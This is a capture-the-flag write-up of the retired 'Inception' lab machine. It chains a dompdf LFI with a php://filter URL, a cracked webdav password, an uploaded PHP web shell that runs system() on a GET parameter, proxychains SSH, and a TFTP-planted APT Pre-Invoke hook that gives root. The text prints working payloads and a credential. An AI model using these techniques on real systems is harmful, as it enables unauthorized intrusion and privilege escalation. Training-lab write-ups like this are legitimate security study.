# Inception - Medium  - Retired

### Initial enumeration

When we first fire nmap we can see only two ports open: 80(web) and 3128(proxy). At first it seems a lot like a newer box, Unbalanced. I tried to access web and it was a  simple page, that let you input the email. 

I've fired up ffuf with `ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://10.10.10.67/FUZZ` in order to look for other directories. An it had a hit.  
```________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.67/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

images                  [Status: 301, Size: 311, Words: 20, Lines: 10]
assets                  [Status: 301, Size: 311, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]
dompdf                  [Status: 301, Size: 311, Words: 20, Lines: 10]
:: Progress: [62283/62283] :: Job [1/1] :: 700 req/sec :: Duration: [0:01:35] :: Errors: 3 ::
```
As you can see `/dompdf` is something that isn't linked. Here we encounter some missconfiguration and we get access to all files from this directory. If we look at the `VERSION` file we get that on the box is running `dompdf 0.6.0` which has a LFI CVE assigned to it on [exploit-db](https://www.exploit-db.com/exploits/33004).

### Discovering another service

At this point we need to exploit a blind LFI. Well, I've looked over /etc/passwd and it was only one user, and then I've searched for the apache2 config on my local kali machine. This was the final link `10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/apache2/sites-enabled/000-default.conf`.
After I've decoded it from base64 I saw that there is another directory `/webdav_test_inception` that's password protected, with the file that containes the password located at `/var/www/html/webdav_test_inception/webdav.passwd`. Now we can download  this one too and run john against the hash. The output was `webdav_tester:babygurl69`.

### Getting the foothold

From a brief google search it seems that webdav is an apache service. Well this time we aren't lucky anymore to say that we can see all the files from the directory. But I've found an article that explains [how to interact with webdav using curl](https://www.qed42.com/blog/using-curl-commands-webdav). First I tried to see if we can upload files  so I've just put a `<?php echo "Hello World"; ?>`  inside a file and uploaded with `curl -T './testUpload.php' -u webdav_tester:babygurl69 http://10.10.10.67/webdav_test_inception/`.

Next I've tried to upload some reverse shells but they were all blocked by firewalls I guess and I've switched to a more clasical approach, using `system` and `$_GET`. If you are curious this is the script:
```php
<?php
    if(isset($_GET['we']))
    {
        echo "Command execution: <br>";
        echo "<pre>";
        system($_GET['we']);
        echo "</pre>";
    }
?>
```
Alright now that we have access to all UNIX commands I've started looking around. In the `/var/www/html` there is a folder called `wordpress_4.8.3`. Here we can find the `wp-config.php` file which might have some credetials, but unfortunately I couldn't use `cat` against it. So I've switched back to dompdf and retrieved it. Our guess was right. There is a password for the so called `database`. Well we can now try to shh into the box.

### Are we cobb?

I said ssh? Nope the port is close? Well if we do `netstat -tulpn |grep LISTEN` it seems that port 22 is open, but it's mapped for 0.0.0.0. So this should mean that we have to use the proxy. 
```java
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 :::3128                 :::*                    LISTEN      -      
```
For this we can add `http 10.10.10.67 3128` at the end of to proxychains config and then just run `proxychains ssh cobb@127.0.0.1`. We are in as cobb now :D

### Root isn't root

If we do a `sudo -l` and pass the password it seems that we have full sudo access. So we do `sudo su` and that's it. Well... no. We are root but inside `root.txt` there is a  hint towards next step.
```bash
root@Inception:~# cat root.txt
You're waiting for a train. A train that will take you far away. Wake up to find root.txt.
```
Well this is a clear hint towards a cronjob. But what cronjob? On this box there is nothing.
I tried to look for other machines that maybe are linked to this proxy, and I saw something weird. We are `192.168.0.10` not `192.168.0.1` or something similar. I fast checked if there are any routes on this with `route -n` and there was another gatway for `192.168.0.1`
```bash
root@Inception:~# route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         192.168.0.1     0.0.0.0         UG    0      0        0 eth0
192.168.0.0     0.0.0.0         255.255.255.0   U     0      0        0 eth0
```

### Actual root

I've uploaded a portable version of nmap to see with what ports we are dealing with. An there were only 3: 21(ftp), 22(ssh), 53(dns).  Well because I like to go in an ascending order I've decied to start with 21. 
Anonymous login was enabled, with the chroot at `/` so we had acess to almost all files. First I've downloaded `/etc/passwd` and saw that ftp and tftp are user, which seemed a bit odd. From a quick google search TFTP seeems to be a service that allows a client to get or put files onto a remote host. So this means there is no permission check?

At this point I've decided to leave TFTP for a while an look into the crontab file. Here we have an interesting line
```bash
*/5 *	* * *	root	apt update 2>&1 >/var/log/apt/custom.log
``` 
It seems that root updates the system every 5 minutes. So I guess that we can hijack this with a script that runs before/after the update. I got lucky to find an article that explains [how to hook  a script to apt upgrade](https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/). This are the steps that I did to get root
- I've generated a key with `ssh-keygen` and saved under `/root/.ssh/id_rsa`
- Got into tftp and placed the `id_rsa.pub` as `authorized_keys` but it had permissions to wide
- I've created a script with `echo 'APT::Update::Pre-Invoke  {"chmod 600 /root/.ssh/authorized_keys";};' > zapwn` that updates permissions for authorized_keys
- Upload this using tftp under at `/etc/apt/apt.conf.d/rootpwn`, again using tftp
Finally I had to wait around 1/2 minutes and I was  able to ssh into the `192.168.0.1`. 

Pwned :D